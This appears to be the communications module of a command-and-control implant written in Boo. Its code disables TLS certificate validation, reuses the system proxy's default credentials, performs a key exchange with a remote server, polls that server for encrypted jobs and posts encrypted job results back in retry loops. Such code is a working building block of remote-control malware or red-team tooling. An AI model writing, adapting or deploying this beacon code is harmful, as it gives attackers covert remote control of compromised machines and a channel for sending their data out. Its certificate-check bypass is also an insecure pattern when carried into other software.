class Response:

    private Request as WebRequest

    def constructor(request as WebRequest):
        Request = request

    public Text:
        get:
            response = Request.GetResponse()
            reader = StreamReader(response.GetResponseStream())
            data = reader.ReadToEnd()
            reader.Close()
            response.Close()
            Request.Abort()
            return data

    public Bytes:
        get:
            data = null
            response = Request.GetResponse()
            using memstream = MemoryStream():
                using reader = response.GetResponseStream():
                    reader.CopyTo(memstream)
                    data = memstream.ToArray()
                    reader.Close()
            response.Close()
            Request.Abort()
            return data


class Requests:

    private proxyAware as bool = true
    private verify as bool = false
    private sslVersions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12

    def constructor():
        ServicePointManager.SecurityProtocol = sslVersions
        ServicePointManager.Expect100Continue = false
        unless verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback({sender, certification, chain, sslPolicyErrors | return true})

    public def Get(url as Uri) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "GET"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        return Response(r)

    public def Post(url as Uri, payload as (byte)) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "POST"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if len(payload):
            r.ContentLength = payload.Length
            using requestStream = r.GetRequestStream():
                requestStream.Write(payload, 0, payload.Length)
                requestStream.Close()

        return Response(r)

    public def Post(url as Uri, payload as string) as Response:
        return Post(url, Encoding.UTF8.GetBytes(payload))

class Comms:
    public Debug as bool = true
    public BaseUrl as Uri
    public JobsUrl as Uri
    public Client as STClient
    private Requests as Requests = Requests()
    private Crypto as Crypto

    def constructor(client as STClient, url as string):
        Client = client
        BaseUrl = Uri(url + Client.Guid.ToString())
        JobsUrl = Uri(BaseUrl + '/jobs')

    def KeyExchange():
        while true:
            try:
                Crypto = Crypto()
                r = Requests.Post(BaseUrl, Crypto.public_key)
                Crypto.derive_key(r.Text)
                break
            except e as Exception:
                if Debug:
                    print "Error performing key exchange: $(e)"
            Thread.Sleep(Client.Sleep)

    def SendJobResults(results as string, job_id as int):
        KeyExchange()

        encrypted_results = Crypto.Encrypt(results)
        job_url = Uri(JobsUrl  + "/$(job_id)")

        while true:
            try:
                Requests.Post(job_url, encrypted_results)
                break
            except e as Exception:
                if Debug:
                    print "Error performing sending job results: " + e
            Thread.Sleep(Client.Sleep)

    def GetJob() as Hash:
        KeyExchange()

        while true:
            try:
                job = Requests.Get(JobsUrl).Bytes
                if len(job):
                    decrypted_data = Encoding.UTF8.GetString(Crypto.Decrypt(job))
                    return JavaScriptSerializer().Deserialize[of Hash](decrypted_data)
                    break
            except e as Exception:
                if Debug:
                    print "Error getting jobs: " + e
            Thread.Sleep(Client.Sleep)